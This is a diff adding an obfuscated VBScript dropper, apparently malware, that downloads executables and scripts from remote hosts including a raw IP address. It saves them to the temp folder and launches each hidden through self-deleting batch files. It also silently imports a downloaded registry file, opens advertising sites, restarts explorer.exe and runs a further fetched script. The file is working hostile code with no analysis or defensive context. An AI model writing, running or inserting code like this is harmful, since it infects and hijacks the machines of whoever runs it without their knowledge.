@@ -1,0 +1,107 @@
+on error resume next
+arrsd0zt="http://e9.china.sogou.google.baidu.com.baidu163so.info"
+Set bh0tq2b5= WScript.CreateObject("WScript.Shell") 
+Set m15h1acg0 = Wscript.CreateObject("Scripting.FileSystemObject") 
+cf407340=bh0tq2b5.ExpandEnvironmentStrings("%temp%")
+w0056l7y = left(cf407340,3)
+
+bh0tq2b5.Run("http://ww"&"w.xs"&"p5.info/index4.htm")
+
+Sub c194q39k5(t1135pw83)
+Set ewcz4oxy= CreateObject("scripting.FileSystemObject") 
+If Not ewcz4oxy.FolderExists(t1135pw83) Then
+  ewcz4oxy.CreateFolder t1135pw83
+End If
+Set ewcz4oxy = Nothing 
+end sub
+
+Call c194q39k5(w0056l7y&"Progra~1\WinRAR\ico")
+Call c194q39k5(w0056l7y&"WINDOWS1")
+
+tv6vl56b=w0056l7y&"WINDOWS1\"
+ico1=w0056l7y&"Progra~1\WinRAR\ico\"
+
+Sub gfgxs8ic(q181qkok1,w15430s4p)
+Set j1156639g = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
+Set k1vx024nx = CreateObject("ADOD"&"B.Strea"&"m")
+with j1156639g
+.Open "GET",q181qkok1,0
+.Send()
+end with
+b=j1156639g.responseBody
+with k1vx024nx
+.type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("j1156639g.res"&"po"&"nse"&"Bod"&"y")
+.SaveToFile w15430s4p,eval ("2")
+end with
+k1vx024nx.close
+end sub
+
+Sub d1i2ett73(e1e7tqw0f,f116e7y6p)
+Set r1qmd21p1 = CreateObject("Scripting.FileSystemObject")
+If r1qmd21p1.FileExists(e1e7tqw0f) Then                   '´æÔÚ
+       r1qmd21p1.deletefile(e1e7tqw0f)
+End If
+    Set g1673b149=r1qmd21p1.CreateTextFile(e1e7tqw0f,False)
+    g1673b149.WriteLine(f116e7y6p)
+    g1673b149.WriteLine("de"&"l %"&"0 ")
+    g1673b149.Close       
+Set r1qmd21p1  = Nothing
+end sub
+
+call gfgxs8ic(arrsd0zt&"/ico/tb.ico",ico1&"tb.ico")
+
+for i=1 to 6
+call gfgxs8ic(arrsd0zt&"/ico/"+cstr(i)+".ico",w0056l7y&"Progra~1\WinRAR\ico\"+cstr(i)+".ico")
+next
+
+call gfgxs8ic(arrsd0zt&"/dy/xing.txt",cf407340&"\xing.vbs")
+ryk949x3=cf407340&"\xingxing.bat"
+call  d1i2ett73(ryk949x3,"start %Temp%\xing.vbs")
+cmd=bh0tq2b5.RUN(ryk949x3, runhide)
+
+call gfgxs8ic("http://222.217.240.30/soft/gua"&"gua4397.exe",cf407340&"\guagua4397.exe")
+ryk949x3=cf407340&"\guagua.bat"
+call  d1i2ett73(ryk949x3,"start %Temp%\guagua4397.exe")
+cmd=bh0tq2b5.RUN(ryk949x3, runhide)
+
+call gfgxs8ic(arrsd0zt&"/dy/bbtbb.html",cf407340&"\bbtbb.exe")
+call d1i2ett73(cf407340&"\dian.bat","start %Temp%\bbtbb.exe")
+cmd=bh0tq2b5.RUN(cf407340&"\dian.bat", runhide)
+
+call gfgxs8ic(arrsd0zt&"/go/page.txt",cf407340&"\page.vbs")
+ryk949x3=cf407340&"\pagepage.bat"
+call  d1i2ett73(ryk949x3,"start %Temp%\page.vbs")
+cmd=bh0tq2b5.RUN(ryk949x3, runhide)
+
+call gfgxs8ic("http://222.217.240.30/soft/uaua4397.exe",cf407340&"\uaua4397.exe")
+ryk949x3=cf407340&"\ua2.bat"
+call  d1i2ett73(ryk949x3,"start %Temp%\uaua4397.exe")
+cmd=bh0tq2b5.RUN(ryk949x3, runhide)
+
+WScript.Sleep 10000
+bh0tq2b5.Run ("http://www.19885.info/?gg")
+
+WScript.Sleep 10000
+bh0tq2b5.Run ("http://www.19858.info/?gg")
+
+WScript.Sleep 10000
+bh0tq2b5.Run ("http://www.19856.info/?gg")
+
+ryk949x3=cf407340&"\ie.reg"
+call gfgxs8ic(arrsd0zt&"/go/ie.txt",ryk949x3)
+bh0tq2b5.Run "regedit /s "&ryk949x3
+
+call gfgxs8ic("http://222.217.240.30/soft/gou4397.exe",cf407340&"\gou4397.exe")
+ryk949x3=cf407340&"\gou.bat"
+call  d1i2ett73(ryk949x3,"start %Temp%\gou4397.exe")
+cmd=bh0tq2b5.RUN(ryk949x3, runhide)
+
+godddd="cmd /c taskkill /f /im explorer.exe"
+bh0tq2b5.Run godddd,0,true
+bh0tq2b5.Run "explorer.exe"
+
+call gfgxs8ic(arrsd0zt&"/go/safe.txt",cf407340&"\safe.vbs")
+bh0tq2b5.Run cf407340&"\safe.vbs",,True
